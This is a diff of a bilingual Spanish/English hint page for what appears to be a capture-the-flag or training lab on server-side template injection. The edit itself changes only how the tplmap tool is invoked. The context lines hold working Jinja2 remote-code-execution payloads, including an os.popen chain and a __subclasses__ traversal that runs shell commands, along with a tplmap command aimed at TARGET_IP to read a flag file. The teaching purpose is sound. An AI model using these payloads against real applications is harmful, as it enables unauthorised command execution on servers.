@@ -47,7 +47,7 @@
     # RCE — leer la flag:
     &#123;%25 print config.__class__.__init__.__globals__['os'].popen('cat /app/secret/ssti-flag.txt').read() %25&#125;</pre></li>
       <li><strong>Hard:</strong> Bloquea <code>{{ "{{" }}</code>, <code>&#123;%25</code>, <code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code>, <code>popen</code>, etc. Usa herramientas automatizadas:
-        <pre>tplmap -u "http://TARGET_IP/ssti?template=*" --os-cmd "cat /app/secret/ssti-flag.txt"</pre></li>
+        <pre>python3 tplmap.py -u "http://TARGET_IP/ssti?template=*" --os-cmd "cat /app/secret/ssti-flag.txt"</pre></li>
       <li>Escala al RCE (Easy) recorriendo la cadena de objetos Python:
         <pre>{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
 {{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() {{ "}}" }}</pre></li>
@@ -75,7 +75,7 @@
     # RCE — read the flag:
     &#123;%25 print config.__class__.__init__.__globals__['os'].popen('cat /app/secret/ssti-flag.txt').read() %25&#125;</pre></li>
       <li><strong>Hard:</strong> Blocks <code>{{ "{{" }}</code>, <code>&#123;%25</code>, <code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code>, <code>popen</code>, etc. Use automated tools:
-        <pre>tplmap -u "http://TARGET_IP/ssti?template=*" --os-cmd "cat /app/secret/ssti-flag.txt"</pre></li>
+        <pre>python3 tplmap.py -u "http://TARGET_IP/ssti?template=*" --os-cmd "cat /app/secret/ssti-flag.txt"</pre></li>
       <li>Escalate to RCE (Easy) by traversing Python's object hierarchy:
         <pre>{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
 {{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() {{ "}}" }}</pre></li>
